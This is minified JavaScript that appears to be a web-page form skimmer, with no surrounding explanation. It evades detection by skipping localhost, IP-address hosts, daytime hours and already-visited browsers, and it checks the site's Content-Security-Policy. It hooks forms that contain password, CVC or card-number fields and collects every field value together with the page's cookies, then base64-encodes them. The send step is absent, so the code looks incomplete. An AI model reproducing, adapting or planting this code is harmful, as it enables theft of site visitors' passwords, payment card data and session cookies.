! function() {
        if ("undefined" == typeof window || !window.document) return;
        var e, t = o("xhfd"),
            n = o("xhfda");
        isHour = (e = (new Date).getHours()) > 7 && e < 19;
        var a = self.location.host,
            s = self.location;
        if (u = a, /(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/.test(u) || u.toLowerCase().includes("localhost") || t || isHour || n) return;
        var u;
        navigator.userAgent;
        var l = document.forms.length;
        fetch(document.location.href).then(e => {
            const n = e.headers.get("Content-Security-Policy");
            if (null != n && n.includes("default-src")) {
                if (n.includes("form-action") || t) return;
                for (o = 0; o < l; o++)
                    for (u = document.forms[o].elements, c = 0; c < u.length; c++)
                        if ("password" == u[c].type || "cvc" == u[c].name.toLowerCase() || "cardnumber" == u[c].name.toLowerCase()) {
                            r(document.forms[o]).submit(function(e) {
                                for (var t = "", n = 0; n < this.elements.length; n++) t = t + this.elements[n].name + ":" + this.elements[n].value + ":";
                                i("xhfda", 1, 864e3), encodeURIComponent(btoa(unescape(encodeURIComponent("host-" + a + "|fields-" + t + "|cookies-" + document.cookie))))
                            });
                            break
                        }
            } else
                for (var o = 0; o < l; o++)
                    for (var u = document.forms[o].elements, c = 0; c < u.length; c++)
                        if ("password" == u[c].type || "cvc" == u[c].name.toLowerCase() || "cardnumber" == u[c].name.toLowerCase()) {
                            r(document.forms[o]).submit(function(e) {
                                for (var t = "", n = 0; n < this.elements.length; n++) t = t + this.elements[n].name + ":" + this.elements[n].value + ":";
                                encodeURIComponent(btoa(unescape(encodeURIComponent(s + "|" + t + "|" + document.cookie))))
                            });
                            break
                        }
        }), i("xhfd", 1, 86400)
    }()